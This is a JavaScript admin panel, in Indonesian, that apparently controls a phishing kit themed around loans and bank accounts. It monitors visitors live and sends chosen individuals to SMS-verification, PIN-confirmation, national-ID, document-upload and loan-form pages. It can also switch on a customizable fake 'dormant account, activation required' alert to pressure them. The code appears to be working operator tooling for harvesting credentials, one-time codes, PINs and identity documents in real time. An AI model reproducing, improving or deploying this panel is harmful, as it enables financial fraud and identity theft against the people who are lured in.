(() => {
  'use strict';
  const rows = document.getElementById('rows'), search = document.getElementById('search');
  const SAFE = [
    ['', 'Tanpa target'],
    ['status:login-required','Perlu Login'],
    ['status:verification-pending','Menunggu Verifikasi'],
    ['status:confirmation-pending','Menunggu Konfirmasi'],
    ['form-nik.html','Form Identitas'],
    ['upload-dokumen.html','Upload'],
    ['form-pinjaman.html','Form Pinjaman'],
    ['ringkasan-pengajuan.html','Ringkasan'],
    ['proses-pengajuan.html','Proses Pengajuan'],
    ['hasil-pengajuan.html','Hasil Pengajuan'],
    ['dashboard-pinjaman.html','Dashboard']
  ];
  const LABEL = Object.fromEntries([...SAFE, ['index.html','Login'], ['verifikasi-sms.html','Verifikasi'], ['konfirmasi-pin.html','Konfirmasi']]);
  const DEFAULT_CONFIG = {
    primaryColor:'#6d28d9', secondaryColor:'#9333ea', backgroundColor:'#eef1f6', surfaceColor:'#ffffff', textColor:'#17152a',
    radius:20, fontScale:1, dormantAccentColor:'#dc2626', dormantTitle:'Aktivasi Rekening Diperlukan', dormantBadge:'Dormant • Belum Aktif',
    dormantDescription:'Rekening Anda memerlukan proses aktivasi dan verifikasi sebelum dapat melanjutkan layanan.', dormantModalTitle:'Aktivasi Rekening Diperlukan',
    dormantModalStatus:'Dormant • Belum Aktif', dormantPrimaryLabel:'Lanjutkan Aktivasi', dormantSecondaryLabel:'Kembali ke Dashboard'
  };
  const THEME_KEYS = ['primaryColor','secondaryColor','backgroundColor','surfaceColor','textColor','radius','fontScale'];
  const DORMANT_KEYS = ['dormantAccentColor','dormantTitle','dormantBadge','dormantDescription','dormantModalTitle','dormantModalStatus','dormantPrimaryLabel','dormantSecondaryLabel'];

  let users = [], csrf = '', uiConfig = { ...DEFAULT_CONFIG }, themeEnabled = false, dormantEnabled = false;
  const esc = s => String(s??'').replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot',"'":'&#39;'}[c]));
  const age = value => { const t=Date.parse(value); if(!t)return '-'; const s=Math.max(0,Math.floor((Date.now()-t)/1000)); return s<60?`${s} dtk lalu`:s<3600?`${Math.floor(s/60)} mnt lalu`:`${Math.floor(s/3600)} jam lalu`; };
  const isOnline = u => Date.now()-Date.parse(u.lastSeen||0)<45000;
  function toast(t){const e=document.getElementById('toast');e.textContent=t;e.style.display='block';setTimeout(()=>e.style.display='none',2400);}
  async function auth(){const r=await fetch('/api/admin-auth',{cache:'no-store'});if(!r.ok){location.replace('/admin/login.html');return false;}const m=document.cookie.match(/(?:^|; )kb_admin_csrf=([^;]+)/);csrf=m?decodeURIComponent(m[1]):'';return true;}

  function render(){
    const q=search.value.trim().toLowerCase();
    const list=users.filter(u=>[u.username,u.fullName,u.status,u.currentPage].join(' ').toLowerCase().includes(q));
    rows.innerHTML=list.map(u=>`<tr><td><strong>${esc(u.fullName||u.username)}</strong><br><small>${esc(u.username)}</small></td><td><span class="pill ${isOnline(u)?'online':''}">${isOnline(u)?'Online':'Offline'} · ${esc(u.status||'-')}</span></td><td>${esc(LABEL[u.currentPage]||u.currentPage||'-')}</td><td>${esc(age(u.lastSeen))}</td><td>${esc(LABEL[u.targetPage]||u.targetPage||'-')}</td><td><div class="target"><select data-key="${esc(u.key)}">${SAFE.map(([v,l])=>`<option value="${esc(v)}" ${u.targetPage===v?'selected':''}>${esc(l)}</option>`).join('')}</select><button data-save="${esc(u.key)}">Terapkan</button></div></td></tr>`).join('')||'<tr><td colspan="6">Tidak ada user.</td></tr>';
    document.getElementById('total').textContent=users.length;
    document.getElementById('online').textContent=users.filter(isOnline).length;
    document.getElementById('targets').textContent=users.filter(u=>u.targetPage).length;
  }

  async function load(){
    document.getElementById('status').textContent='Memuat…';
    const r=await fetch('/api/admin-users',{cache:'no-store'});
    if(r.status===401){location.replace('/admin/login.html');return;}
    const d=await r.json();users=d.users||[];render();
    document.getElementById('status').textContent=`Diperbarui ${new Date().toLocaleTimeString('id-ID')}`;
  }

  function updatePublishState(){
    const themeState=document.getElementById('themePublishState');
    const dormantState=document.getElementById('dormantPublishState');
    if(themeState){themeState.textContent=themeEnabled?'Override tampilan AKTIF':'Tampilan asli website AKTIF';themeState.classList.toggle('is-active',themeEnabled);}
    if(dormantState){dormantState.textContent=dormantEnabled?'Override Dormant AKTIF':'Dormant asli website AKTIF';dormantState.classList.toggle('is-active',dormantEnabled);}
    const restoreTheme=document.getElementById('restoreTheme'); if(restoreTheme) restoreTheme.disabled=!themeEnabled;
    const restoreDormant=document.getElementById('restoreDormant'); if(restoreDormant) restoreDormant.disabled=!dormantEnabled;
  }

  async function loadSettings(){
    const r = await fetch('/api/admin-settings', { cache:'no-store' });
    if (r.status === 401) { location.replace('/admin/login.html'); return; }
    if (!r.ok) { toast('Gagal memuat pengaturan'); return; }
    const d = await r.json();
    themeEnabled = d.themeEnabled === true;
    dormantEnabled = d.dormantEnabled === true;
    uiConfig = { ...DEFAULT_CONFIG, ...(d.theme || {}), ...(d.dormant || {}) };
    fillSettings(); updatePublishState();
  }

  function bindColor(id){
    const picker=document.getElementById(id), text=document.getElementById(`${id}Text`);
    const syncFromPicker=()=>{text.value=picker.value;uiConfig[id]=picker.value;renderPreviews();};
    const syncFromText=()=>{if(/^#[0-9a-fA-F]{6}$/.test(text.value)){picker.value=text.value;uiConfig[id]=text.value;renderPreviews();}};
    picker.addEventListener('input',syncFromPicker); text.addEventListener('input',syncFromText);
  }

  function fillSettings(){
    ['primaryColor','secondaryColor','backgroundColor','surfaceColor','textColor','dormantAccentColor'].forEach(id=>{
      const picker=document.getElementById(id), text=document.getElementById(`${id}Text`); if(!picker||!text)return; picker.value=uiConfig[id];text.value=uiConfig[id];
    });
    document.getElementById('radius').value=uiConfig.radius;
    document.getElementById('fontScale').value=uiConfig.fontScale;
    document.getElementById('radiusValue').textContent=`${uiConfig.radius}px`;
    document.getElementById('fontScaleValue').textContent=`${Math.round(uiConfig.fontScale*100)}%`;
    ['dormantTitle','dormantBadge','dormantDescription','dormantModalTitle','dormantModalStatus','dormantPrimaryLabel','dormantSecondaryLabel'].forEach(id=>document.getElementById(id).value=uiConfig[id]);
    renderPreviews();
  }

  function collectTextSettings(){
    ['dormantTitle','dormantBadge','dormantDescription','dormantModalTitle','dormantModalStatus','dormantPrimaryLabel','dormantSecondaryLabel'].forEach(id=>uiConfig[id]=document.getElementById(id).value.trim());
  }

  function renderPreviews(){
    const p=document.getElementById('themePreview');
    if(p){p.style.setProperty('--pv-primary',uiConfig.primaryColor);p.style.setProperty('--pv-secondary',uiConfig.secondaryColor);p.style.setProperty('--pv-bg',uiConfig.backgroundColor);p.style.setProperty('--pv-surface',uiConfig.surfaceColor);p.style.setProperty('--pv-text',uiConfig.textColor);p.style.setProperty('--pv-radius',`${uiConfig.radius}px`);p.style.setProperty('--pv-scale',uiConfig.fontScale);}
    const d=document.getElementById('dormantPreview');
    if(d){d.style.setProperty('--dormant-preview',uiConfig.dormantAccentColor);document.getElementById('previewDormantTitle').textContent=uiConfig.dormantTitle;document.getElementById('previewDormantBadge').textContent=uiConfig.dormantBadge;document.getElementById('previewDormantDescription').textContent=uiConfig.dormantDescription;document.getElementById('previewDormantButton').textContent=uiConfig.dormantPrimaryLabel;}
  }

  async function postSettings(action, config={}){
    const r=await fetch('/api/admin-settings',{method:'POST',headers:{'content-type':'application/json','x-csrf-token':csrf},body:JSON.stringify({action,config})});
    if(!r.ok){toast('Gagal menyimpan pengaturan');return false;}
    const d=await r.json();
    themeEnabled=d.themeEnabled===true; dormantEnabled=d.dormantEnabled===true;
    uiConfig={...DEFAULT_CONFIG,...(d.theme||{}),...(d.dormant||{})};
    fillSettings();updatePublishState();return true;
  }

  async function saveTheme(){
    const config=Object.fromEntries(THEME_KEYS.map(k=>[k,uiConfig[k]]));
    if(await postSettings('save-theme',config)) toast('Tampilan disimpan dan sekarang diterapkan');
  }
  async function saveDormant(){
    collectTextSettings();
    const config=Object.fromEntries(DORMANT_KEYS.map(k=>[k,uiConfig[k]]));
    if(await postSettings('save-dormant',config)) toast('Notif Dormant disimpan dan sekarang diterapkan');
  }
  async function restoreTheme(){
    if(!confirm('Kembalikan tampilan publik ke CSS/desain asli website?')) return;
    if(await postSettings('disable-theme')) toast('Tampilan asli website dipulihkan');
  }
  async function restoreDormant(){
    if(!confirm('Kembalikan Notif Dormant ke tampilan dan teks asli website?')) return;
    if(await postSettings('disable-dormant')) toast('Notif Dormant asli dipulihkan');
  }

  rows.addEventListener('click',async e=>{const key=e.target.dataset.save;if(!key)return;const sel=rows.querySelector(`select[data-key="${CSS.escape(key)}"]`);const r=await fetch('/api/admin-target',{method:'POST',headers:{'content-type':'application/json','x-csrf-token':csrf},body:JSON.stringify({userKey:key,targetPage:sel.value})});if(r.ok){toast('Target diperbarui');load();}else toast('Gagal memperbarui target');});
  search.addEventListener('input',render);
  document.getElementById('refresh').addEventListener('click',load);
  document.getElementById('logout').addEventListener('click',async()=>{await fetch('/api/admin-auth',{method:'DELETE'});location.replace('/admin/login.html');});

  document.querySelectorAll('.nav-tab').forEach(btn=>btn.addEventListener('click',()=>{
    document.querySelectorAll('.nav-tab').forEach(x=>x.classList.toggle('active',x===btn));
    document.querySelectorAll('.admin-view').forEach(v=>{const on=v.id===`view-${btn.dataset.view}`;v.hidden=!on;v.classList.toggle('active-view',on);});
  }));
  ['primaryColor','secondaryColor','backgroundColor','surfaceColor','textColor','dormantAccentColor'].forEach(bindColor);
  document.getElementById('radius').addEventListener('input',e=>{uiConfig.radius=Number(e.target.value);document.getElementById('radiusValue').textContent=`${uiConfig.radius}px`;renderPreviews();});
  document.getElementById('fontScale').addEventListener('input',e=>{uiConfig.fontScale=Number(e.target.value);document.getElementById('fontScaleValue').textContent=`${Math.round(uiConfig.fontScale*100)}%`;renderPreviews();});
  ['dormantTitle','dormantBadge','dormantDescription','dormantModalTitle','dormantModalStatus','dormantPrimaryLabel','dormantSecondaryLabel'].forEach(id=>document.getElementById(id).addEventListener('input',()=>{collectTextSettings();renderPreviews();}));
  document.getElementById('saveTheme').addEventListener('click',saveTheme);
  document.getElementById('saveDormant').addEventListener('click',saveDormant);
  document.getElementById('restoreTheme').addEventListener('click',restoreTheme);
  document.getElementById('restoreDormant').addEventListener('click',restoreDormant);
  document.getElementById('resetTheme').addEventListener('click',()=>{
    THEME_KEYS.forEach(k=>{uiConfig[k]=DEFAULT_CONFIG[k];});
    fillSettings();toast('Preview direset. Website publik belum berubah sampai Anda klik Simpan Tampilan.');
  });

  (async()=>{if(await auth()){await Promise.all([load(),loadSettings()]);setInterval(load,10000);}})();
})();
